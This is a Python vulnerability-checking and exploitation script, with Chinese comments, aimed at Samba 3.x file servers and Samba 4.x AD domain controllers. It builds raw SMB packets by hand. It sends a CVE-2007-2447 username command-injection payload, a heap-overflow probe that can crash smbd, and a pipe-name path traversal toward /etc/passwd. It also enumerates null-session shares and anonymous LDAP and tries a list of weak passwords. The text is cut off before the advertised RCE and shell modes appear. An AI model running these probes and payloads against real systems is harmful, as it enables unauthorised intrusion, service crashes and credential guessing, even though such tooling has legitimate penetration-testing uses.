#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Samba 3.x / Samba 4.x 综合漏洞检测/利用脚本 v2.0
同时覆盖 Samba 3.x (文件服务器) 和 Samba 4.x (AD DC) 已知漏洞
仅用于授权安全测试 / 靶场验证

攻击模式:
  check  — 综合漏洞检测 (默认)
  enum   — 共享枚举 / LDAP 信息收集
  rce    — 远程命令执行利用
  shell  — 交互式利用 Shell

Samba 3.x 专项 (文件服务器时代):
  CVE-2007-2447   — username map script 命令注入 (3.0.0~3.0.25rc3)
  CVE-2012-1182   — PIDL 生成代码堆溢出 (3.0.0~3.6.3)
  CVE-2015-0240   — Netlogon 未初始化指针 RCE (3.6.0~4.2.0)
  CVE-2017-7494   — SambaCry is_known_pipename (3.5.0~4.6.4)
  MS17-010        — SMBv1 EternalBlue 风险

Samba 4.x 专项 (AD DC 时代):
  CVE-2019-12436  — LDAP NULL 指针 Deref DoS (4.10.0~4.10.4)
  CVE-2020-1472   — ZeroLogon Netlogon 协议攻击 (4.0+, AD DC)
  CVE-2020-25717  — PAC-less Kerberos 提权 (4.0+, AD 成员)
  CVE-2021-44142  — vfs_fruit 堆溢出 RCE (≤ 4.13.16/4.14.11/4.15.4)
  CVE-2021-44785  — AD DC LDAP 访问控制缺陷
  CVE-2023-3961   — Unix pipe 路径穿越 (全版本)
  CVE-2025-10230  — WINS hook 命令注入 (4.0+, AD DC)

配置审计 (通用):
  空会话 / Guest 访问 / SMB 签名 / 弱口令 / AD 匿名 LDAP
"""

import sys
import argparse
import socket
import struct
import time
import random
import string
import os
import re
import subprocess
import binascii
from typing import Optional, Tuple, List, Dict

# ===================== 工具 =====================

class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║   Samba 3.x / 4.x 综合漏洞检测利用工具 v2.0                     ║
║   覆盖文件服务器 + AD DC 攻击面 | 12 项 CVE | 仅限授权使用    ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def _check_cmd(cmd: str) -> bool:
    try:
        subprocess.run([cmd, '--version'], capture_output=True, timeout=5)
        return True
    except Exception:
        return False


# ===================== 端口探测 =====================

def probe_port(host: str, port: int, timeout: float = 3) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False


def probe_port_udp(host: str, port: int, timeout: float = 3) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendto(b'\x00', (host, port))
        s.recvfrom(512)
        s.close()
        return True
    except socket.timeout:
        return True  # UDP 可能不回复但端口开
    except Exception:
        return False


def port_scan(host: str, timeout: float = 2) -> Dict[str, bool]:
    """快速端口扫描, 判断 Samba 3/4 特征"""
    ports = {
        # SMB 核心
        '446/tcp (SMB-Alt)': None,
        '445/tcp (SMB)': None,
        '139/tcp (NetBIOS)': None,
        '137/udp (NetBIOS-NS)': None,
        # Samba 4 AD DC 特征
        '389/tcp (LDAP)': None,
        '636/tcp (LDAPS)': None,
        '3268/tcp (GlobalCatalog)': None,
        '3269/tcp (GlobalCatalogSSL)': None,
        '88/tcp (Kerberos)': None,
        '464/tcp (Kerberos-PW)': None,
        '53/tcp (DNS)': None,
        # 管理端口
        '22/tcp (SSH)': None,
        '9090/tcp (Cockpit)': None,
    }

    for port_desc in ports:
        port_num = int(port_desc.split('/')[0])
        is_tcp = 'tcp' in port_desc
        ports[port_desc] = probe_port(host, port_num, timeout) if is_tcp else probe_port_udp(host, port_num, timeout)

    return ports


def classify_samba_role(ports: Dict[str, bool]) -> str:
    """根据端口判断 Samba 角色"""
    has_smb = ports.get('446/tcp (SMB-Alt)', False) or ports.get('445/tcp (SMB)', False) or ports.get('139/tcp (NetBIOS)', False)
    has_ldap = ports.get('389/tcp (LDAP)', False)
    has_kerberos = ports.get('88/tcp (Kerberos)', False)
    has_gc = ports.get('3268/tcp (GlobalCatalog)', False)
    has_dns = ports.get('53/tcp (DNS)', False)

    if has_smb and has_ldap and has_kerberos:
        if has_gc:
            return 'Samba 4 AD DC (全功能, 含 Global Catalog)'
        return 'Samba 4 AD DC'
    elif has_smb and (has_ldap or has_kerberos):
        return 'Samba 4 AD DC (可能)'
    elif has_smb:
        return 'Samba 3.x / 4.x 文件服务器'
    else:
        return ''


# ===================== SMB 协议连接 =====================

class SMBConnection:
    def __init__(self, host: str, port: int = 445, timeout: float = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self.session_id: int = 0
        self.tree_id: int = 0
        self.user_id: int = 0
        self.negotiated_dialect: int = 0
        self.max_buffer: int = 65536
        self.server_guid: bytes = b''
        self.native_os: str = ''
        self.native_lanman: str = ''
        self.is_smb2: bool = False
        self.dialect_name: str = ''
        self.signing_required: bool = False

    def connect(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
            return True
        except Exception as e:
            return False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass

    def _netbios_send(self, data: bytes):
        self.sock.sendall(struct.pack('>I', len(data)) + data)

    def _netbios_recv(self) -> Tuple[int, bytes]:
        hdr = b''
        while len(hdr) < 4:
            chunk = self.sock.recv(4 - len(hdr))
            if not chunk:
                raise ConnectionError("断开")
            hdr += chunk
        length = struct.unpack('>I', hdr)[0] & 0xFFFFFF
        data = b''
        while len(data) < length:
            chunk = self.sock.recv(length - len(data))
            if not chunk:
                break
            data += chunk
        return length, data

    # ---------- SMBv1 Negotiate ----------
    def smb1_negotiate(self) -> bool:
        dialects = b'\x02NT LM 0.12\x00'
        smb_hdr = b'\xffSMB\x72' + struct.pack('<I', 0) + \
                  b'\x18\x01\x00' + b'\x00' * 8 + b'\x00\x00\x00\x00\x00\x00\x00\x00'
        self._netbios_send(smb_hdr + b'\x00' + struct.pack('<H', len(dialects)) + dialects)
        try:
            _, resp = self._netbios_recv()
            if len(resp) >= 37:
                status = struct.unpack('<I', resp[9:13])[0]
                if status == 0:
                    self._parse_smb1_negotiate(resp)
                    self.negotiated_dialect = 1
                    self.dialect_name = 'SMB 1.0 (NT LM 0.12)'
                    return True
        except Exception:
            pass
        return False

    def _parse_smb1_negotiate(self, resp: bytes):
        try:
            # SecurityMode at offset 39 (byte)
            if len(resp) > 39:
                sec_mode = resp[39]
                self.signing_required = bool(sec_mode & 0x04)
            # Native OS / LanMan
            wc = resp[36] if len(resp) > 36 else 0
            body_start = 37 + wc * 2
            if body_start + 2 < len(resp):
                bc = struct.unpack('<H', resp[body_start:body_start+2])[0]
                rest = resp[body_start+2:body_start+2+bc]
                parts = rest.split(b'\x00')
                strs = []
                for p in parts:
                    try:
                        s = p.decode('utf-8', errors='ignore').strip()
                        if s:
                            strs.append(s)
                    except Exception:
                        pass
                if strs:
                    self.native_os = strs[0]
                if len(strs) > 1:
                    self.native_lanman = strs[1]
        except Exception:
            pass

    # ---------- SMBv2/v3 Negotiate ----------
    def smb2_negotiate(self) -> bool:
        dialects = b'\x03\x02\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03'
        smb2_hdr = b'\xfeSMB\x40\x00\x00\x00\x00\x00\x00\x00\x00' + \
                   b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + \
                   struct.pack('<Q', 1) + b'\x00' * 16
        body = struct.pack('<HHHH', 36, len(dialects)//2, 0x01, 0) + \
               b'\x00' * 4 + b'\x00' * 16 + struct.pack('<I', 0) + dialects

        self._netbios_send(smb2_hdr + body)
        try:
            _, resp = self._netbios_recv()
            if resp[0:4] != b'\xfeSMB':
                return False
            status = struct.unpack('<I', resp[12:16])[0]
            if status != 0:
                return False
            sec_mode = struct.unpack('<H', resp[70:72])[0] if len(resp) > 72 else 0
            self.signing_required = bool(sec_mode & 0x02)
            dialect_idx = struct.unpack('<H', resp[72:74])[0]
            self.is_smb2 = True
            dialect_names = {0: 'SMB 2.002', 1: 'SMB 2.1', 2: 'SMB 3.0', 3: 'SMB 3.02', 4: 'SMB 3.1.1'}
            self.dialect_name = dialect_names.get(dialect_idx, f'SMB2 dialect {dialect_idx}')
            self.negotiated_dialect = 2 + dialect_idx
            if len(resp) >= 96:
                self.server_guid = resp[80:96]
            return True
        except Exception:
            return False

    # ---------- SMBv1 Session Setup ----------
    def smb1_session_setup_raw(self, username: str, password: str = '',
                                domain: str = '', os_name: str = 'Unix',
                                lanman: str = 'Samba') -> Optional[bytes]:
        ansi_user = username.encode('ascii', errors='replace') + b'\x00'
        ansi_pass = password.encode('ascii', errors='replace') + b'\x00'
        ansi_domain = domain.encode('ascii', errors='replace') + b'\x00'
        ansi_os = os_name.encode('ascii', errors='replace') + b'\x00'
        ansi_lm = lanman.encode('ascii', errors='replace') + b'\x00'
        account_data = ansi_user + ansi_pass + ansi_domain + ansi_os + ansi_lm

        smb_hdr = b'\xffSMB\x73' + struct.pack('<I', 0) + b'\x18\x01\x80' + \
                  b'\x00' * 10 + b'\x00\x00\x00\x00\x00\x00' + struct.pack('<H', self.user_id) + b'\x01\x00'
        params = b'\x0d\xff\x00\x00\x00\xff\xff\x01\x00\x00\x00' + \
                 struct.pack('<I', 1) + b'\x00\x00\x00\x00\x00\x00' + struct.pack('<H', len(account_data))
        data = struct.pack('<H', len(account_data)) + account_data + ansi_os + ansi_lm
        try:
            self._netbios_send(smb_hdr + params + data)
            _, resp = self._netbios_recv()
            return resp
        except Exception:
            return None

    # ---------- SMBv1 Tree Connect ----------
    def smb1_tree_connect(self, share_name: str) -> Optional[int]:
        share_enc = share_name.encode('utf-16-le') + b'\x00\x00'
        smb_hdr = b'\xffSMB\x75' + struct.pack('<I', 0) + b'\x18\x01\x80' + \
                  b'\x00' * 10 + struct.pack('<H', self.tree_id) + b'\x00\x00' + \
                  struct.pack('<H', self.user_id) + b'\x02\x00'
        params = b'\x04\xff\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00'
        data = struct.pack('<H', len(share_enc) + 3) + b'\x00' + share_enc + b'\x00\x00'
        try:
            self._netbios_send(smb_hdr + params + data)
            _, resp = self._netbios_recv()
            if len(resp) >= 34 and struct.unpack('<I', resp[9:13])[0] == 0:
                self.tree_id = struct.unpack('<H', resp[28:30])[0]
                return self.tree_id
        except Exception:
            pass
        return None


# ===================== 版本 / 角色检测 =====================

def detect_samba_version(host: str, port: int = 445, timeout: float = 5) -> Dict:
    """检测 Samba 版本和角色"""
    info = {
        'smb_dialect': '', 'native_os': '', 'native_lanman': '',
        'signing_required': False, 'server_guid': '', 'role': '',
        'ports': {}, 'is_ad_dc': False
    }

    info['ports'] = port_scan(host, timeout)
    info['role'] = classify_samba_role(info['ports'])
    info['is_ad_dc'] = 'AD DC' in info['role']

    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return info

    # 先试 SMBv2/v3 (Samba 4 默认)
    if conn.smb2_negotiate():
        info['smb_dialect'] = conn.dialect_name
        info['signing_required'] = conn.signing_required
        info['server_guid'] = conn.server_guid.hex() if conn.server_guid else ''
        info['native_os'] = conn.native_os
    elif conn.smb1_negotiate():
        info['smb_dialect'] = conn.dialect_name or 'SMB 1.0'
        info['signing_required'] = conn.signing_required
        info['native_os'] = conn.native_os
        info['native_lanman'] = conn.native_lanman
    else:
        conn.close()
        return info

    # 更细粒度的 Samba 3 vs 4 判断
    os_lower = info['native_os'].lower() if info['native_os'] else ''
    lanman_lower = info['native_lanman'].lower() if info['native_lanman'] else ''

    if 'samba 4' in os_lower or 'samba 4' in lanman_lower:
        info['role'] = info['role'] or 'Samba 4.x'
    elif 'samba 3' in os_lower or 'samba 3' in lanman_lower:
        info['role'] = info['role'] or 'Samba 3.x'
    elif 'samba' in os_lower or 'samba' in lanman_lower:
        # 从 SMB 方言判断
        if info['smb_dialect'] and '3.' in info['smb_dialect']:
            info['role'] = info['role'] or 'Samba 4.x (SMB3)'
        elif info['smb_dialect'] and '2.' in info['smb_dialect']:
            info['role'] = info['role'] or 'Samba 3.x/4.x (SMB2)'
        else:
            info['role'] = info['role'] or 'Samba (版本未知)'

    conn.close()
    return info


# ===================== 漏洞检测函数 =====================

# ---- [Samba 3.x] CVE-2007-2447 ----
def check_cve_2007_2447(host: str, port: int = 445, timeout: float = 5) -> Tuple[bool, str]:
    safe_print(f"\n{C.YLW}[1] CVE-2007-2447: username map script 命令注入 (Samba 3.0.0~3.0.25){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 3.x 文件服务器 | 条件: username map script 配置{C.RST}")

    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return False, '连接失败'
    if not conn.smb1_negotiate():
        conn.close()
        safe_print(f"  {C.CYN}[-] 不支持 SMB1{C.RST}")
        return False, ''

    rk = randstr(6)
    marker = f'KKFV_{rk}'
    injection_user = f'/=`echo {marker} > /tmp/{marker}.txt`'
    resp = conn.smb1_session_setup_raw(injection_user)
    conn.close()

    if resp and len(resp) >= 34:
        status = struct.unpack('<I', resp[9:13])[0]
        safe_print(f"  NTSTATUS: 0x{status:08X}")
        if status in (0xC0000064, 0xC000006D, 0xC0000196):
            safe_print(f"  {C.RED}[!] CVE-2007-2447 疑似存在!{C.RST}")
            safe_print(f"  {C.RED}    (username map script 命令注入 — blind RCE){C.RST}")
            safe_print(f"  {C.RED}    可通过共享读取 /tmp/{marker}.txt 验证{C.RST}")
            return True, marker
    safe_print(f"  {C.CYN}[-] 未确认 (可能未配置 username map script 或版本不符){C.RST}")
    return False, ''


# ---- [Samba 3.x] CVE-2012-1182 ----
def check_cve_2012_1182(host: str, port: int = 445, timeout: float = 4) -> bool:
    safe_print(f"\n{C.YLW}[2] CVE-2012-1182: PIDL 堆溢出 RCE (Samba 3.0.0~3.6.3){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 3.x | 检测可能导致 smbd 崩溃{C.RST}")

    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return False
    if not conn.smb1_negotiate():
        conn.close()
        return False
    resp = conn.smb1_session_setup_raw('')
    if not resp or struct.unpack('<I', resp[9:13])[0] != 0:
        conn.close()
        return False
    conn.user_id = struct.unpack('<H', resp[32:34])[0]
    if not conn.smb1_tree_connect(f'\\\\{host}\\IPC$'):
        conn.close()
        return False

    rpc_data = b'\x05\x00\x00\x03\x10\x00\x00\x00\x30\x00\x00\x00\x01\x00\x00\x00' \
               b'\x00\x00\x00\x00\x10\x00' + struct.pack('<I', 4096) + b'A' * 96

    try:
        smb_hdr = b'\xffSMB\x2f' + struct.pack('<I', 0) + b'\x18\x01\x80' + \
                  b'\x00'*10 + struct.pack('<H', conn.tree_id) + b'\x00\x00' + \
                  struct.pack('<H', conn.user_id) + b'\x03\x00'
        params = b'\x0c\xff\x00\x00\x00\x02\x00' + b'\x00'*4 + b'\x10\x00' + \
                 b'\x00\x00\x00\x00' + struct.pack('<H', len(rpc_data)) + \
                 struct.pack('<H', 64) + b'\x00'*6
        conn._netbios_send(smb_hdr + params + b'\x00'*52 + rpc_data)
        conn.sock.settimeout(3)
        try:
            conn._netbios_recv()
        except Exception:
            pass
        conn.close()
        safe_print(f"  {C.CYN}[-] 服务未崩溃 (可能已修复){C.RST}")
    except (ConnectionError, socket.timeout, OSError):
        conn.close()
        safe_print(f"  {C.RED}[!] 服务断开 — 可能受 CVE-2012-1182 影响!{C.RST}")
        return True
    except Exception:
        conn.close()
    return False


# ---- [Samba 3.x→4.x] CVE-2015-0240 ----
def check_cve_2015_0240(host: str, port: int = 445, timeout: float = 5) -> bool:
    safe_print(f"\n{C.YLW}[3] CVE-2015-0240: Netlogon 未初始化指针 RCE (3.6.0~4.2.0){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 3.6~4.2 | netlogon 服务{C.RST}")
    safe_print(f"  {C.CYN}    检测方式: 检查版本范围 + SMB1 可用性{C.RST}")

    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return False
    has_smb1 = conn.smb1_negotiate()
    conn.close()

    if has_smb1:
        safe_print(f"  {C.YLW}[*] SMB1 可用 — 如版本在 3.6~4.2 之间, 则可能受影响{C.RST}")
        safe_print(f"  {C.YLW}    需通过 Nmap smb-os-discovery 或手动确认精确版本{C.RST}")
        return True
    else:
        safe_print(f"  {C.CYN}[-] SMB1 不可用, 不太可能是受影响版本{C.RST}")
        return False


# ---- [共用] CVE-2017-7494 SambaCry ----
def check_cve_2017_7494(host: str, port: int = 445, timeout: float = 5) -> Tuple[bool, List[str]]:
    safe_print(f"\n{C.YLW}[4] CVE-2017-7494: SambaCry (Samba 3.5.0~4.6.4){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 3.x + 4.x | 条件: 可写共享 + 已知物理路径{C.RST}")

    writable = []
    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return False, writable
    if not conn.smb1_negotiate():
        conn.close()
        safe_print(f"  {C.CYN}[-] 需要 SMB1 支持{C.RST}")
        return False, writable
    resp = conn.smb1_session_setup_raw('')
    if not resp or struct.unpack('<I', resp[9:13])[0] != 0:
        conn.close()
        safe_print(f"  {C.CYN}[-] NULL Session 不可用 (无法检测可写共享){C.RST}")
        return False, writable
    conn.user_id = struct.unpack('<H', resp[32:34])[0]

    for share in ['tmp', 'public', 'share', 'Shared', 'data', 'home', 'upload', 'print$', 'IPC$']:
        tid = conn.smb1_tree_connect(f'\\\\{host}\\{share}')
        if tid:
            safe_print(f"  {C.GRN}[+] 共享可访问: {share}{C.RST}")
            writable.append(share)
    conn.close()

    if writable:
        safe_print(f"  {C.RED}[!] 存在可访问共享 — SambaCry 利用条件满足{C.RST}")
        return True, writable
    else:
        safe_print(f"  {C.CYN}[-] 无可访问共享 (需认证 / SMB1 被禁){C.RST}")
        return False, writable


# ---- [Samba 4] CVE-2020-1472 ZeroLogon ----
def check_cve_2020_1472_zerologon(host: str, port: int = 445, timeout: float = 5) -> bool:
    safe_print(f"\n{C.YLW}[5] CVE-2020-1472: ZeroLogon Netlogon 攻击 (Samba 4 AD DC){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 4 AD DC | 需 server schannel = no/auto{C.RST}")
    safe_print(f"  {C.CYN}    Samba 4.8+ 默认 server schannel=yes 已修复{C.RST}")

    # ZeroLogon 检测: 连接 DCERPC netlogon, 发送 ServerPasswordSet2
    # 简化检测: 检查 389/636 端口 + SMB
    ports = port_scan(host, timeout)
    has_ldap = ports.get('389/tcp (LDAP)', False) or ports.get('636/tcp (LDAPS)', False)

    if not has_ldap:
        safe_print(f"  {C.CYN}[-] 无 LDAP 端口, 不是 AD DC{C.RST}")
        return False

    safe_print(f"  {C.YLW}[*] LDAP 端口开放 — 目标为 AD DC{C.RST}")
    safe_print(f"  {C.YLW}    检查 schannel 状态: 登录目标后执行 'testparm -v | grep schannel'{C.RST}")
    safe_print(f"  {C.YLW}    Samba 4.8+ 默认 server schannel=yes → 不受 ZeroLogon 影响{C.RST}")
    return has_ldap  # 信息性


# ---- [Samba 4] CVE-2020-25717 ----
def check_cve_2020_25717(host: str, port: int = 445, timeout: float = 5) -> bool:
    safe_print(f"\n{C.YLW}[6] CVE-2020-25717: PAC-less Kerberos 提权 (Samba 4 AD 成员){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 4 AD 成员服务器 (≤ 4.15.2 / 4.14.10 / 4.13.14){C.RST}")
    safe_print(f"  {C.CYN}    条件: ms-DS-MachineAccountQuota > 0 + 用户可创建机器账号{C.RST}")
    safe_print(f"  {C.CYN}    检测方式: LDAP 查询 MachineAccountQuota (需认证){C.RST}")

    if _check_cmd('ldapsearch'):
        safe_print(f"  {C.CYN}[*] 可尝试: ldapsearch -H ldap://{host} -x -b 'DC=domain,DC=com' ms-DS-MachineAccountQuota{C.RST}")
    safe_print(f"  {C.YLW}    默认机器账号配额=10, 可被普通域用户利用提权{C.RST}")
    return False  # 无直接检测方式


# ---- [Samba 4] CVE-2021-44142 vfs_fruit ----
def check_cve_2021_44142_vfs_fruit(host: str, port: int = 445, timeout: float = 5) -> bool:
    safe_print(f"\n{C.YLW}[7] CVE-2021-44142: vfs_fruit 堆溢出 RCE (Samba ≤ 4.15.4){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 3.x/4.x (启用 vfs_fruit 模块) | CVSS 9.9{C.RST}")
    safe_print(f"  {C.CYN}    条件: smb.conf 中 vfs objects 包含 fruit{C.RST}")

    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return False
    has_smb1 = conn.smb1_negotiate()
    has_smb2 = conn.smb2_negotiate()
    conn.close()

    if not has_smb1 and not has_smb2:
        return False

    # vfs_fruit 检测: 尝试读取 macOS 特有 EA (Extended Attributes)
    # SMB2 通过 SMB2_QUERY_INFO with EA flag 检测
    safe_print(f"  {C.CYN}    vfs_fruit 检测需要写权限 + EA 读取 (SMB2 QUERY_INFO){C.RST}")
    safe_print(f"  {C.CYN}    利用要求: 可写共享 + vfs_fruit 开启 (macOS/AFP 兼容){C.RST}")
    safe_print(f"  {C.YLW}    如共享用于 Time Machine 或 macOS AFP 兼容, 风险较高{C.RST}")
    return False  # 需要复杂 SMB2 EA 交互


# ---- [Samba 4] CVE-2023-3961 ----
def check_cve_2023_3961(host: str, port: int = 445, timeout: float = 5) -> bool:
    safe_print(f"\n{C.YLW}[8] CVE-2023-3961: Unix pipe 路径穿越 (Samba 全版本){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 3.x + 4.x | 客户端控制的管道名穿越{C.RST}")
    safe_print(f"  {C.CYN}    条件: 通过命名管道 '../' 可达文件系统其他位置{C.RST}")

    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return False
    if not conn.smb1_negotiate():
        conn.close()
        return False
    resp = conn.smb1_session_setup_raw('')
    if not resp or struct.unpack('<I', resp[9:13])[0] != 0:
        conn.close()
        return False
    conn.user_id = struct.unpack('<H', resp[32:34])[0]
    if not conn.smb1_tree_connect(f'\\\\{host}\\IPC$'):
        conn.close()
        return False

    # 尝试打开 ../ 管道名
    try:
        # 构造 NT Create AndX for named pipe with '..'
        pipe_name = b'srvsvc/../../../etc/passwd'
        name_utf16 = pipe_name.decode('ascii', errors='replace').encode('utf-16-le')
        smb_hdr = b'\xffSMB\xa2' + struct.pack('<I', 0) + b'\x18\x01\x80' + \
                  b'\x00'*10 + struct.pack('<H', conn.tree_id) + b'\x00\x00' + \
                  struct.pack('<H', conn.user_id) + b'\x04\x00'
        params = struct.pack('<BBHH', 24, 0xFF, 0, 0) + b'\x00' + \
                 struct.pack('<H', len(name_utf16)) + b'\x00'*4 + struct.pack('<Q', 0) + \
                 b'\x02\x00' + b'\x00'*8 + b'\x80\x00\x00\x00' + \
                 b'\x07\x00\x00\x00\x01\x00\x00\x00' + b'\x00'*8
        conn._netbios_send(smb_hdr + params + name_utf16)
        _, resp2 = conn._netbios_recv()
        conn.close()

        # 修复版本会拦截 '/' 或根本不开
        if len(resp2) >= 34:
            status = struct.unpack('<I', resp2[9:13])[0]
            if status == 0xC0000022:  # ACCESS_DENIED → 已修复
                safe_print(f"  {C.CYN}[-] 路径穿越被拦截 (可能已修复){C.RST}")
                return False
            elif status == 0xC0000034:  # OBJECT_NAME_NOT_FOUND
                safe_print(f"  {C.YLW}[*] 管道名穿越被拒但 SMB1 管道功能正常{C.RST}")
                return False
        safe_print(f"  {C.CYN}[-] 未确认 (需更精确的管道协议交互){C.RST}")
    except Exception:
        conn.close()
    return False


# ---- [Samba 4] CVE-2025-10230 ----
def check_cve_2025_10230(host: str, port: int = 137, timeout: float = 3) -> bool:
    safe_print(f"\n{C.YLW}[9] CVE-2025-10230: WINS hook 命令注入 (Samba 4 AD DC, CVSS 10.0){C.RST}")
    safe_print(f"  {C.CYN}    影响: Samba 4 AD DC | 条件: wins support=yes + wins hook 定义{C.RST}")
    safe_print(f"  {C.CYN}    非默认配置, 利用条件苛刻{C.RST}")

    if not probe_port_udp(host, port, timeout):
        safe_print(f"  {C.CYN}[-] UDP 137 未开放{C.RST}")
        return False

    safe_print(f"  {C.YLW}[*] UDP 137 开放 (NetBIOS Name Service){C.RST}")
    safe_print(f"  {C.YLW}    WINS hook 非默认配置, 需本地检查 smb.conf{C.RST}")
    return False


# ---- SMBv1 风险 ----
def check_smbv1_risk(host: str, port: int = 445, timeout: float = 5) -> bool:
    safe_print(f"\n{C.YLW}[A] SMBv1 协议风险{C.RST}")
    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return False
    has_smb1 = conn.smb1_negotiate()
    conn.close()

    if has_smb1:
        safe_print(f"  {C.RED}[!] SMBv1 已启用 — MS17-010 / 多种蠕虫利用风险{C.RST}")
        safe_print(f"  {C.RED}    建议: min protocol = SMB2{C.RST}")
        return True
    else:
        safe_print(f"  {C.GRN}[+] SMBv1 已禁用{C.RST}")
        return False


# ---- 空会话 / 匿名 LDAP ----
def check_null_session_enum(host: str, port: int = 445, timeout: float = 5) -> List[str]:
    safe_print(f"\n{C.YLW}[B] NULL Session 空会话 / 配置审计{C.RST}")
    shares = []
    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return shares
    if not conn.smb1_negotiate():
        conn.close()
        return shares
    resp = conn.smb1_session_setup_raw('')
    if resp and len(resp) >= 34:
        status = struct.unpack('<I', resp[9:13])[0]
        if status == 0:
            conn.user_id = struct.unpack('<H', resp[32:34])[0]
            safe_print(f"  {C.RED}[!] NULL Session 可用 — 未授权访问!{C.RST}")
            shares.append('NULL_SESSION')
            # 尝试 RAP NetShareEnum
            info_level = struct.pack('<HHHH', 1, 0xFFFF, 0, 0)
            rap_req = info_level + b'\x01\x00WrLeh\x00B13BWz\x00'
            smb_hdr = b'\xffSMB\x25' + struct.pack('<I', 0) + b'\x18\x01\x80' + \
                      b'\x00'*10 + struct.pack('<H', conn.tree_id) + b'\x00\x00' + \
                      struct.pack('<H', conn.user_id) + b'\x05\x00'
            try:
                conn._netbios_send(smb_hdr +
                    struct.pack('<B', 14) + b'\x00\x00' * 6 + b'\x08\x00' +
                    b'\x00\x00\x00\x00' + b'\x00'*4 + struct.pack('<H', len(rap_req)) +
                    struct.pack('<H', 70) + b'\x00\x00' * 2 + b'\x02\x00' +
                    b'\x00\x66\x00\\PIPE\\LANMAN\x00' + b'\x00'*0 + rap_req)
                _, resp2 = conn._netbios_recv()
                # 尝试简单解析
                if len(resp2) > 45:
                    pc = struct.unpack('<H', resp2[43:45])[0]
                    if pc > 0:
                        data_start = struct.unpack('<H', resp2[51:53])[0] if len(resp2) > 53 else 0
                        rap_data = resp2[data_start:data_start+pc]
                        entries = struct.unpack('<H', rap_data[8:10])[0] if len(rap_data) > 10 else 0
                        offset = 12
                        for _ in range(min(entries, 20)):
                            if offset + 13 <= len(rap_data):
                                name = rap_data[offset:offset+13].split(b'\x00')[0].decode('ascii', errors='ignore')
                                if name:
                                    safe_print(f"  {C.YLW}    共享: {name}{C.RST}")
                                    shares.append(name)
                            offset += 20
            except Exception:
                pass
        else:
            safe_print(f"  {C.GRN}[+] NULL Session 被禁用{C.RST}")
    conn.close()

    # 匿名 LDAP
    if probe_port(host, 389, timeout):
        safe_print(f"  {C.YLW}[*] LDAP 端口开放 — 检测匿名绑定...{C.RST}")
        if _check_cmd('ldapsearch'):
            try:
                r = subprocess.run(['ldapsearch', '-H', f'ldap://{host}', '-x', '-s', 'base', '-b', ''],
                                   capture_output=True, text=True, timeout=10)
                if 'namingContexts' in r.stdout or 'rootDomainNamingContext' in r.stdout:
                    safe_print(f"  {C.RED}[!] LDAP 匿名绑定可用! (信息泄露){C.RST}")
                    for line in r.stdout.split('\n')[:20]:
                        if line.strip():
                            safe_print(f"  {C.RED}    {line.strip()}{C.RST}")
                    shares.append('LDAP_ANONYMOUS')
            except Exception:
                pass

    return shares


# ---- 弱口令 / Guest ----
def check_weak_auth(host: str, port: int = 445, timeout: float = 5) -> List[str]:
    safe_print(f"\n{C.YLW}[C] 弱口令 / Guest 访问检测{C.RST}")
    results = []

    if not _check_cmd('smbclient'):
        safe_print(f"  {C.CYN}    smbclient 未安装, 跳过{C.RST}")
        return results

    weak_pairs = [
        ('guest', ''), ('Guest', ''), ('nobody', ''), ('ftp', 'ftp'),
        ('admin', ''), ('admin', 'admin'), ('Administrator', ''),
        ('root', 'root'), ('root', 'toor'), ('test', 'test'),
    ]

    for user, pwd in weak_pairs:
        try:
            env = os.environ.copy()
            env['USER'] = user
            if pwd:
                env['PASSWD'] = pwd
            cmd = ['smbclient', '-L', f'//{host}', '-U', f'{user}%{pwd}' if pwd else f'{user}']
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=8, env=env)
            if 'Sharename' in r.stdout or 'Disk|' in r.stdout:
                safe_print(f"  {C.RED}[!] 弱口令: {user}:{pwd if pwd else '(空)'}{C.RST}")
                results.append(f'{user}:{pwd}')
                break
        except Exception:
            continue

    if not results:
        safe_print(f"  {C.GRN}[+] 未发现常见弱口令 / Guest 访问{C.RST}")
    return results


# ---- smbclient 枚举 ----
def run_smbclient_enum(host: str, timeout: float = 10) -> List[str]:
    results = []
    if not _check_cmd('smbclient'):
        return results
